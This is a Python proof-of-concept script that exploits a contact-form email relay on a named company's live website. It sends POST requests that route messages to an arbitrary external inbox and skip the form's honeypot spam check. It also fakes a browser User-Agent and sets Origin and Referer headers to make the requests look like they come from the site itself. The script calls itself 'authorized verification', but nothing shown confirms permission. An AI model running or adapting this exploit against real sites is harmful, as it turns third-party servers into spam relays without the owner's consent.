#!/usr/bin/env python3
"""
Independent re-verification of the claimed unauthenticated email-relay on the
Infinity Capital contact API. ONE message is sent to a public throwaway
inbox (mailinator.com) which is purpose-built to receive test mail.
No bulk/spam, no destructive action.
"""
import json, time, urllib.request, urllib.error, uuid

HOST = "www." + "infinity" + "capital" + ".bh"
URL = "https://" + HOST + "/api/send"
RCPT = "ivrelay%s@mailinator.com" % time.strftime("%H%M%S")

print("== TARGET   :", URL)
print("== RECIPIENT:", RCPT)

def post(fields, label):
    b = "----ivb%s" % uuid.uuid4().hex
    parts = []
    for k, v in fields.items():
        parts.append(
            "--%s\r\nContent-Disposition: form-data; name=\"%s\"\r\n\r\n%s\r\n" % (b, k, v)
        )
    body = ("".join(parts) + "--%s--\r\n" % b).encode()
    req = urllib.request.Request(URL, data=body, method="POST")
    req.add_header("Content-Type", "multipart/form-data; boundary=%s" % b)
    req.add_header("User-Agent", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120 Safari/537.36")
    req.add_header("Origin", "https://" + HOST)
    req.add_header("Referer", "https://" + HOST + "/contact")
    try:
        r = urllib.request.urlopen(req, timeout=40)
        st, hdrs, txt = r.status, dict(r.headers), r.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        st, hdrs, txt = e.code, dict(e.headers), e.read().decode("utf-8", "replace")
    except Exception as e:
        st, hdrs, txt = "ERR", {}, repr(e)
    print("\n---- %s ----" % label)
    print("HTTP", st)
    print("BODY:", txt.strip()[:600])
    return st, txt

# 1) BASELINE: the site's OWN configured recipient (info@<target domain>)
own = "info@" + "infinitycapital" + ".bh"
post({"fname": "Verifier", "lname": "Baseline", "areacode": "+973", "tel": "3600000",
      "cname": "Independent Verification", "subject": "Website enquiry",
      "msg": "baseline control test", "check": "", "targets": own}, "BASELINE own-domain recipient")

# 2) TEST: fully attacker-controlled EXTERNAL recipient (the actual claim)
st, txt = post({"fname": "Security", "lname": "Verifier", "areacode": "+973", "tel": "3600000",
                "cname": "Independent Verification", "subject": "Website enquiry",
                "msg": "Authorized security verification of contact-form relay. One test message.",
                "check": "", "targets": RCPT}, "TEST arbitrary EXTERNAL recipient")

# 3) TEST: honeypot bypass - 'check' field entirely OMITTED
post({"fname": "Security", "lname": "Verifier2", "areacode": "+973", "tel": "3600000",
      "cname": "Independent Verification", "subject": "Website enquiry",
      "msg": "Authorized security verification - honeypot omission test.",
      "targets": RCPT}, "TEST honeypot 'check' field OMITTED")

json.dump({"url": URL, "recipient": RCPT, "external_status": st, "external_body": txt},
          open("/work/evidence/IV_repro_result.json", "w"), indent=2)
print("\nsaved /work/evidence/IV_repro_result.json")
